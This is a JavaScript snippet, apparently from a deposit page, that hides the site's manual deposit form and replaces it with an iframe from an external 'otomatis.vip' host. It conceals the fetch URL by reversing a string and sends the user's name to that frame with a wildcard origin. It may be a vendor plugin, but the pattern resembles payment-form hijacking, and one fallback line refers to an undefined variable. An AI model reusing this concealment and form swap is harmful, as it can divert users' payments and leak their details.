var urlframe = '';
var usernameQris = '';
var isDesktop=true;

var eventMethod = window.addEventListener ? "addEventListener" : "attachEvent";
var eventer = window[eventMethod];
var messageEvent = eventMethod === "attachEvent" ? "onmessage" : "message";
eventer(messageEvent, function (e) { 
    if (typeof e.data == "string") {
        if (e.data === 'onload') {
            document.getElementById('iframeautodepog8').contentWindow.postMessage('{"username":"'+usernameQris+'","judul":""}','*');
        } else if(e.data.charAt(0) == '{') {
            var heightC = JSON.parse(e.data);
            if(heightC.height) {
                document.getElementById('containerautodepog8').style.height = heightC.height + 'px';
            }
        }
    }
});

function setupOtomatis() {
    var selectul='#tab1';
    if(!isDesktop) {
        $('#showM #mob-content ul').attr('id','ulmenumobile');
        selectul='#ulmenumobile';
    }

    $(selectul + ' > li').first().removeClass('active');
    $(selectul + ' > li').first().children().attr('href','javascript:void(0)');
    $(selectul + ' > li').first().children().removeAttr('url');
    $(selectul + ' > li').first().children().removeAttr('class');
    $(selectul + ' > li').first().children().attr('id','btndepositmanual'); 
    $(selectul).prepend('<li class="active"><a id="btndepositotomatis" href="javascript:void(0)">Deposit Otomatis</a></li>');
    if(isDesktop) {
        $('#confirm-form').parent().parent().prepend('<div class="tab-pane fade active in" id="div-deposit-otomatis"><h4>Deposit Otomatis</h4><div id="containerautodepog8" style="height: 450px;opacity:100%;"><iframe id="iframeautodepog8" scrolling="no" style="height: 100%; width: 100%; overflow: hidden;" src="'+urlframe+'"></iframe></div></div>');
        $('#confirm-form').parent().attr('id','div-deposit-manual');
        $('#confirm-form').parent().hide();

        $('#btndepositmanual').click(function(){
            $('#btndepositmanual').parent().addClass('active');
            $('#div-deposit-manual').show();

            $('#btndepositotomatis').parent().removeClass('active');
            $('#div-deposit-otomatis').hide();
        });

        $('#btndepositotomatis').click(function(){
            $('#btndepositmanual').parent().removeClass('active');
            $('#div-deposit-manual').hide();

            $('#btndepositotomatis').parent().addClass('active');
            $('#div-deposit-otomatis').show();
        });
    } else {
        $('#mob-content div[id="#deposit"]').attr('id','div-deposit-manual');
        $('#div-deposit-manual').parent().append('<div class="tab-pane fade active in" id="div-deposit-otomatis"><div id="containerautodepog8" style="height: 450px;opacity:100%;"><iframe id="iframeautodepog8" scrolling="no" style="height: 100%; width: 100%; overflow: hidden;" src="'+urlframe+'"></iframe></div></div>');
        $('#div-deposit-manual').hide();
        $('#mob-content h2').text('Deposit Otomatis');

        $('#btndepositmanual').click(function(){
            $('#mob-content h2').text('Deposit');
            $('#btndepositmanual').parent().addClass('active');
            $('#div-deposit-manual').show();
            $('#btndepositotomatis').parent().removeClass('active');
            $('#div-deposit-otomatis').hide();
        });

        $('#btndepositotomatis').click(function(){
            $('#mob-content h2').text('Deposit Otomatis');
            $('#btndepositmanual').parent().removeClass('active');
            $('#div-deposit-manual').hide();
            $('#btndepositotomatis').parent().addClass('active');
            $('#div-deposit-otomatis').show();
        });
    }
}

if($('#confirm-form').length>0) {
    if($('#confirm-form').attr('action')=='/ajax/cm/reqDeposit') {
        fetch("/atad/piv.sitamoto.1emarfi//:sptth".split('').reverse().join('') + uuidautodepo + ".txt")
        .then(res => {
            if(res.ok) {
                return res.text();
            } else {
                return fetch(response.headers.get('Location')).then(res => res.text());
            }
        })
        .then(data => {
            if(data!='') {
                urlframe = 'https://iframe1.otomatis.vip/?data='+data;
                if($('#showM').is(':visible')) isDesktop=false;
                usernameQris=$('.j-name:first').text().toLowerCase();
                setupOtomatis();
            }
        });
    }
}